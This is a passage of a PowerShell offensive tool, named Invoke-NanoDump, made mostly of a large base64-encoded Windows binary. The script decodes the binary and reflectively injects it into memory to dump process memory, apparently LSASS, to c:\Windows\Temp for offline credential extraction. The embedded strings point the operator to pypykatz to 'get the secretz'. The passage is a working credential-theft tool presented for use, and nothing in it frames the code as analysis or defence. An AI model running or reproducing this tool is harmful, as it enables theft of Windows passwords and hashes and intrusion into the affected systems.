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AAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjIuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjEuMAAAAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTEuMS4wAAAAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxMS4xLjAAAAAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDExLjIuMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAEQAAAAEAEAEBAAAD4RAAAEEAEAQBEAAIkRAAAMEAEAkBEAALYUAAAUEAEAwBQAAN0UAAAoEAEA4BQAAP0UAABIEAEAABUAABQVAABoEAEAIBUAACEVAABwEAEAMBUAAD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NldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgCCBVNsZWVwAKUFVGxzR2V0VmFsdWUA1AVWaXJ0dWFsUHJvdGVjdAAA1gVWaXJ0dWFsUXVlcnkAAAsGV2lkZUNoYXJUb011bHRpQnl0ZQA4AF9fQ19zcGVjaWZpY19oYW5kbGVyAABAAF9fX2xjX2NvZGVwYWdlX2Z1bmMAQwBfX19tYl9jdXJfbWF4X2Z1bmMAAFIAX19nZXRtYWluYXJncwBTAF9faW5pdGVudgBUAF9faW9iX2Z1bmMAAFsAX19sY29udl9pbml0AABhAF9fc2V0X2FwcF90eXBlAABjAF9fc2V0dXNlcm1hdGhlcnIAAHIAX2FjbWRsbgB5AF9hbXNnX2V4aXQAAIsAX2NleGl0AACXAF9jb21tb2RlAAC+AF9lcnJubwAA3ABfZm1vZGUAABsBX2luaXR0ZXJtAIEBX2xvY2sAJwJfb25leGl0ALICX3RpbWU2NADHAl91bmxvY2sACANfd2NzaWNtcAAAhQNhYm9ydACSA2F0b2kAAJYDY2FsbG9jAACjA2V4aXQAALcDZnByaW50ZgC5A2ZwdXRjAL4DZnJlZQAAywNmd3JpdGUAAPQDbG9jYWxlY29udgAA+gNtYWxsb2MAAP0DbWJzdG93Y3MAAAIEbWVtY3B5AAAEBG1lbXNldAAAFgRyYW5kAAAiBHNpZ25hbAAAKwRzcmFuZAAyBHN0cmNtcAAANwRzdHJlcnJvcgAAOQRzdHJsZW4AADwEc3RybmNtcABABHN0cnJjaHIAXgR2ZnByaW50ZgAAdAR3Y3NjcHkAAHgEd2NzbGVuAAB5BHdjc25jYXQAADABAEFEVkFQSTMyLmRsbAAAAAAUMAEAFDABABQwAQAUMAEAFDABABQwAQAUMAEAFDABABQwAQAUMAEAFDABABQwAQAUMAEAFDABABQwAQAUMAEAFDABABQwAQAUMAEAFDABABQwAQBLRVJORUwzMi5kbGwAAAAAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABACgwAQAoMAEAKDABAG1zdmNydC5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBEAQAEAAAAAAAAAAAAAAAAAAAAAAAAAEBAAQAEAAADQRABAAQAAAAAAAAAAAAAAAAAAAAAAAAAgRQBAAQAAAPBEAEABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAADAAAAJiqAAAAsAAADAAAAOCvAAAAwAAAHAAAAGCgcKCAoIigkKCYoKCgsKDAoAAAANAAABwAAABgqYCpiKmQqZipwK/Qr+Cv8K8AAADgAAA8AAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoQBAAQAUAAAACKAgoCigQKBIoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAuZWhfZnJhbWUA'
    $NanoDump = [Convert]::FromBase64String($B64NanoDump)
    $Guid = New-Guid
    $Path = "c:\Windows\Temp\$Guid.db"


    Invoke-ReflectivePEInjection -PEBytes $NanoDump -DoNotZeroMZ -ExeArgs "--write $Path"

    If (Test-Path $Path) {
        Write-Output "Dump file successfully written to $Path"
    }
    Else {
        Write-Output "Dump file doesn't seem to exist"
    }
}
Write-Host "Usage: Invoke-NanoDump"